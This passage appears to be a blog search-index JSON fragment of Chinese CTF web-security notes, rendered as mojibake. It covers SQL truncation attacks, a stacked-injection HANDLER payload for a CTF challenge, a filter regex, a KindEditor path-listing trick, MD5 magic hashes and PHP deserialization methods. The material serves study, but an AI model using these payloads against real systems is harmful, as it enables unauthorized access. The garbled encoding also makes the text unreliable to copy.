¼\n```\n\n```\n--+ï¼Œ%23ï¼Œ#å°†åé¢çš„è¯­å¥æ³¨é‡Š\n```\n\n10ã€SQLçº¦æŸæ”»å‡»\n\nåœ¨SQLä¸­æ‰§è¡Œå­—ç¬¦ä¸²å¤„ç†æ—¶ï¼Œå­—ç¬¦ä¸²æœ«å°¾çš„ç©ºæ ¼ç¬¦å°†ä¼šè¢«åˆ é™¤ã€‚ä¾‹å¦‚å¦‚ä¸‹ä»£ç ï¼š\n\n```sql\nSELECT userId from user where username = 'test            '//çœ‹è¿™é‡Œæœ‰å¾ˆå¤šç©ºæ ¼\n```\n\nä¸Šè¿°ä»£ç å’Œusername = 'test'ç»“æœæ˜¯ä¸€æ ·çš„ã€‚ä½†ä¹Ÿå­˜åœ¨å¼‚å¸¸æƒ…å†µï¼Œæœ€å¥½çš„ä¾‹å­å°±æ˜¯LIKEå­å¥äº†ã€‚æ³¨æ„ï¼Œå¯¹å°¾éƒ¨ç©ºç™½ç¬¦çš„è¿™ç§ä¿®å‰ªæ“ä½œï¼Œä¸»è¦æ˜¯åœ¨â€œ**å­—ç¬¦ä¸²æ¯”è¾ƒ**â€æœŸé—´è¿›è¡Œçš„ã€‚è¿™æ˜¯å› ä¸ºï¼Œ**SQLä¼šåœ¨å†…éƒ¨ä½¿ç”¨ç©ºæ ¼æ¥å¡«å……å­—ç¬¦ä¸²**ï¼Œ**ä»¥ä¾¿åœ¨æ¯”è¾ƒä¹‹å‰ä½¿å…¶å®ƒä»¬çš„é•¿åº¦ä¿æŒä¸€è‡´**ã€‚\n\nåœ¨æ‰€æœ‰çš„INSERTæŸ¥è¯¢ä¸­ï¼ŒSQLéƒ½ä¼šæ ¹æ®varchar(n)æ¥é™åˆ¶å­—ç¬¦ä¸²çš„æœ€å¤§é•¿åº¦ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœå­—ç¬¦ä¸²çš„é•¿åº¦å¤§äºâ€œnâ€ä¸ªå­—ç¬¦çš„è¯ï¼Œé‚£ä¹ˆä»…æ’å…¥å­—ç¬¦ä¸²çš„å‰â€œnâ€ä¸ªå­—ç¬¦ã€‚æ¯”å¦‚ç‰¹å®šåˆ—çš„é•¿åº¦çº¦æŸä¸ºâ€œ5â€ä¸ªå­—ç¬¦ï¼Œé‚£ä¹ˆåœ¨æ’å…¥å­—ç¬¦ä¸²â€œtestNameâ€æ—¶ï¼Œå®é™…ä¸Šåªèƒ½æ’å…¥å­—ç¬¦ä¸²çš„å‰5ä¸ªå­—ç¬¦ï¼Œå³â€œtestNâ€ã€‚\n\n```php\n//æ³¨å†Œç¤ºä¾‹ä»£ç \n<?php\n$username = mysql_real_escape_string($_GET['username']);\n$password = mysql_real_escape_string($_GET['password']);\n$query = \"SELECT *\n          FROM users\n          WHERE username='$username'\";\n$res = mysql_query($query, $database);\nif($res) {\n  if(mysql_num_rows($res) > 0) {\n  }\n  else {\n    $query = \"INSERT INTO users(username, password)\n?>\n```\n\nè¿™é‡Œæ³¨å†Œæ—¶ä½¿ç”¨ç”¨æˆ·å+ã€å¤§é‡ç©ºæ ¼ã€‘å’Œéšæœºå¯†ç æ³¨å†Œå³å¯å®Œæˆæ”»å‡»ã€‚\n\nä¸»è¦åŸç†å°±æ˜¯insertæ—¶å€™æœ‰varchar(n)çš„é™åˆ¶ï¼Œå¤§äºnçš„æ—¶å€™ä¼šæˆªå–å‰nä¸ªå­˜å…¥ã€‚åœ¨æ•°æ®åº“å¯¹å­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒæ—¶ï¼Œå³selectæ“ä½œï¼Œå¦‚æœä¸¤ä¸ªå­—ç¬¦ä¸²çš„é•¿åº¦ä¸ä¸€æ ·ï¼Œåˆ™ä¼šå°†è¾ƒçŸ­çš„å­—ç¬¦ä¸²æœ«å°¾å¡«å……ç©ºæ ¼ï¼Œä½¿ä¸¤ä¸ªå­—ç¬¦ä¸²çš„é•¿åº¦ä¸€è‡´ã€‚æ³¨å†Œæ—¶selectè¯­å¥ä¸ä¼šå°†\"admin+[å¤§é‡ç©ºæ ¼]11\"åˆ å‡åˆ°nä½ï¼Œæ‰€ä»¥ä¸ä¼šè¢«selectæŸ¥å‡ºä¸adminé‡å¤ï¼Œä¸ä¼šè¿”å›æ•°æ®ï¼Œæ¥ä¸‹æ¥å°±å¯ä»¥æ’å…¥admin+[ç©ºæ ¼]ï¼ˆæˆªå–ï¼‰11å’Œè‡ªå®šä¹‰å¯†ç äº†ã€‚\n\nå¦‚æœä½¿ç”¨ç”¨æˆ·åâ€œvampireâ€å’Œå¯†ç â€œrandom_passâ€ç™»å½•çš„è¯ï¼Œå¯¹æ¯”æ—¶æ˜¯adminä¸admin+[å¤§é‡ç©ºæ ¼]ï¼Œä¼šå°†å‰é¢çš„adminæ·»åŠ ç©ºæ ¼ä¸åé¢çš„é•¿åº¦ç›¸åŒåœ¨è¿›è¡Œå¯¹æ¯”ï¼Œé‚£ä¹ˆè¿”å›çš„åªèƒ½æ˜¯æˆ‘ä»¬è‡ªå·±æ³¨å†Œçš„ç”¨æˆ·ä¿¡æ¯ï¼Œè€Œä¸ä¼šè¿”å›ç›®æ ‡ç”¨æˆ·ä¿¡æ¯ã€‚SQLæŸ¥è¯¢è¯­å¥æ˜¯ä¸€ä¸ªandæ“ä½œï¼Œå¦‚æœå¯†ç ä¸ä¸€æ ·æ€ä¹ˆä¼šæŠŠç›®æ ‡ç”¨æˆ·çš„ä¿¡æ¯ä¹Ÿè¿”å›å›æ¥?\n\nå½“ç™»é™†æ—¶ä½¿ç”¨adminä¸è‡ªå®šä¹‰å¯†ç ç™»é™†ï¼Œæ•°æ®åº“å°†è¿”å›æˆ‘ä»¬è‡ªå·±æ³¨å†Œçš„è´¦æˆ·ä¿¡æ¯ï¼Œä½†æ˜¯æ³¨æ„æ­¤å¤„çš„return $usernameï¼Œè™½ç„¶æ­¤æ—¶æŸ¥è¯¢å‡ºæ¥çš„æ˜¯æˆ‘ä»¬è‡ªå·±çš„ç”¨æˆ·ä¿¡æ¯ï¼Œä½†æ˜¯è¿”å›çš„ç”¨æˆ·ååˆ™æ˜¯ç›®æ ‡çš„ç”¨æˆ·åã€‚å¦‚æœæ­¤åçš„ä¸šåŠ¡é€»è¾‘ç›´æ¥ä»¥è¯¥ç”¨æˆ·åä¸ºå‡†ï¼Œåˆ™æˆ‘ä»¬å°±è¾¾åˆ°äº†æ°´å¹³è¶Šæƒçš„ç›®çš„ã€‚\n\n\n\n\n\n**HANDLERè¯­å¥æŸ¥è¯¢**\n\nå‡ºè‡ªè¯¥é¢˜[GYCTF2020]Blacklistï¼Œç±»ä¼¼äºæŸé“å †å æ³¨å…¥çš„è¿›é˜¶ç‰ˆï¼Œä½†æ˜¯è¯¥é¢˜è¿‡æ»¤å¤ªå¤šäº†ï¼Œä¹‹å‰é‚£é“é¢˜çš„payloadå®Œå…¨ä¸å¯ç”¨äº†\n\n```\nreturn preg_match(\"/set|prepare|alter|rename|select|update|delete|drop|insert|where|\\./i\",$inject);\n```\n\nçŸ¥è¯†ç‚¹ï¼šhandlerè¯­å¥æŸ¥è¯¢\n\n```mysql\n\nHANDLER tbl_name OPEN [ [AS] alias]\n \nHANDLER tbl_name READ index_name { = | <= | >= | < | > } (value1,value2,...)\n    [ WHERE where_condition ] [LIMIT ... ]\nHANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST }\n    [ WHERE where_condition ] [LIMIT ... ]\nHANDLER tbl_name READ { FIRST | NEXT }\n    [ WHERE where_condition ] [LIMIT ... ]\n \nHANDLER tbl_name CLOSE\n\n```\n\næ„é€ å‡ºè¯­å¥å¦‚ä¸‹\n\n```\npayload:\n1';use supersqli;handler FlagHere open;handler FlagHere read first;handler FlagHere close;#\n```\n","tags":["Note","web","SQL"]},{"title":"CTFé›¶ç¢ç¬”è®°","url":"/2022/01/08/CTFé›¶ç¢ç¬”è®°/","content":"\n# é›¶ç¢ç¬”è®°\n\nmt_srand( )è¯¥å‡½æ•°åœ¨PHP4.2.0ä¹‹å‰ä¼ å…¥ä»»æ„å‚æ•°åç”Ÿæˆçš„éƒ½æ˜¯ä¼ªéšæœºæ•°ï¼Œåœ¨ä»»ä½•æœºå™¨ä¸Šåªè¦è¿è¡Œçš„åŒæ ·çš„seedå‚æ•°ç»“æœéƒ½ç›¸åŒ\n\n<!--more-->\n\nKindEditorç¼–è¾‘å™¨æ¼æ´ï¼Œåœ¨ä½¿ç”¨è¯¥ç¼–è¾‘å™¨æ˜¯åœ¨urlæœ«å°¾åŠ ä¸Š/php/file_manager_json.php?path=è·¯å¾„ï¼Œå°±ä¼šä¾¿åˆ©è·¯å¾„ä¸­æ‰€æœ‰å†…å®¹ï¼Œç‰¹å¾ä¸ºå‰ç«¯ä»£ç ä¸­æœ‰å¯¹php/file_manager_json.phpçš„å¼•ç”¨\n\n###### md5å¼±ç›¸ç­‰ç»•è¿‡ï¼š\n\n1ã€æ„é€ æ•°ç»„a[]=xxxx&b[]=xxxx\n\n2ã€å¼±ç›¸ç­‰æ—¶è½¬æ¢ä¸ºç›¸åŒæ•°æ®ç±»å‹ï¼Œ0eå¼€å¤´çš„å­—ç¬¦ä¸²ä¼šè¢«è½¬ä¸º0ï¼Œå­—ç¬¦ä¸²å¦‚ä¸‹\n\n```\nQNKCDZO//0e830400451993494058024219903391\ns878926199a//0e545993274517709034328855841020\ns155964671a//0e342768416822451524974117254469\ns214587387a//0e848240448830537924465865611904\ns214587387a//0e848240448830537924465865611904\ns878926199a//0e545993274517709034328855841020\ns1091221200a//0e940624217856561557816327384675\n```\n\n\n\n## åºåˆ—åŒ–ä¸ååºåˆ—åŒ–ï¼š\n\n#### åºåˆ—åŒ–ï¼š\n\nå°†ä¸€ä¸ªå¯¹è±¡è½¬åŒ–ä¸ºä¸€ä¸ªæœ‰åºçš„å­—ç¬¦ä¸²\n\n#### åºåˆ—åŒ–æ ¼å¼ï¼š\n\nç»“æ„ç±»å‹:\n\n```php\nå¯¹è±¡åé•¿åº¦:\"å¯¹è±¡å\":ç±»ä¸­é¡¹ç›®æ•°é‡:{é¡¹ç›®1ç±»å‹:é¡¹ç›®1é•¿åº¦:â€é¡¹ç›®1å†…å®¹â€;é¡¹ç›®2ç±»å‹:é¡¹ç›®2é•¿åº¦:â€é¡¹ç›®2å†…å®¹â€;} \n```\n\nä¾‹å­ï¼š\n\n```php\nO:4:\"xctf\":2:{s:4:\"flag\";s:3:\"111\";}\n//Oä»£è¡¨å¯¹è±¡ç±»å‹ï¼Œsä»£è¡¨å­—ç¬¦ä¸²ç±»å‹\n```\n\n#### åºåˆ—åŒ–æœ‰å…³å‡½æ•°ï¼š\n\n```php\nserialize(å¯¹è±¡)//å°†å¯¹è±¡è¿›è¡Œåºåˆ—åŒ–ï¼Œè¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²\n```\n\n```php\nunserialize(å­—ç¬¦ä¸²)//å°†å¯¹åº”å­—ç¬¦ä¸²è¿›è¡Œååºåˆ—åŒ–æ“ä½œï¼Œè¿”å›ä¸€ä¸ªç±»\n```\n\n```php\n__wakeup()//è¯¥å‡½æ•°ä¸ºç±»å†…å‡½æ•°ï¼Œå¦‚æœåºåˆ—åŒ–ä¸­å¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸæ˜¯ä¸ªæ•°æ—¶å°±ä¼šè·³è¿‡è¯¥å‡½æ•°æ‰§è¡Œ\t\n```\n\n```PHP\n__construct\n// è§¦å‘æ¡ä»¶ï¼Œæ„é€ å‡½æ•°ï¼Œå½“æ„é€ ä¸€ä¸ªå¯¹è±¡æ—¶è°ƒç”¨ã€‚\n// å¯¹è±¡åˆ›å»ºæ—¶é”€æ¯\n__destruct\n// è§¦å‘æ¡ä»¶ï¼Œææ„å‡½æ•°ï¼Œå¯¹è±¡é”€æ¯æ—¶è¢«è°ƒç”¨ã€‚\n// åºåˆ—åŒ–æ—¶ä¼šé”€æ¯ä¸€æ¬¡ï¼Œå¯¹è±¡é”€æ¯æ—¶æ‰§è¡Œï¼Œåºåˆ—åŒ–è¾“å‡ºå‰è¿è¡Œï¼Œä½†ä¸å½±å“åºåˆ—åŒ–å†…å®¹\n__unserialize\n// è§¦å‘æ¡ä»¶ï¼Œ7.4ç‰ˆæœ¬ä»¥ä¸Šï¼Œååºåˆ—åŒ–æ—¶å‡ºå‘ï¼Œä¸”å¯ä»¥ç»•è¿‡__wakeup\n__sleep()\n// åœ¨å¯¹è±¡è¢«åºåˆ—åŒ–ä¹‹å‰è¿è¡Œ\n__wakeup()\n// åœ¨å¯¹è±¡è¢«ååºåˆ—åŒ–ä¹‹åè¢«è°ƒç”¨\n__invoke\n// å½“å¯¹è±¡è¢«è°ƒç”¨æ—¶æ‰§è¡Œ\n// å‡½æ•°å½¢å¼è°ƒç”¨å¯¹è±¡æ—¶ï¼Œè§¦å‘çš„æ–¹æ³•\n```\n\n","tags":["Note","web"]},{"title":"CTF","url":"/2022/01/08/CTF/","content":"\nJlançš„CTFä¹‹æ—…ä»ç°åœ¨å¼€å§‹äº†\n\n","tags":["Note"]}]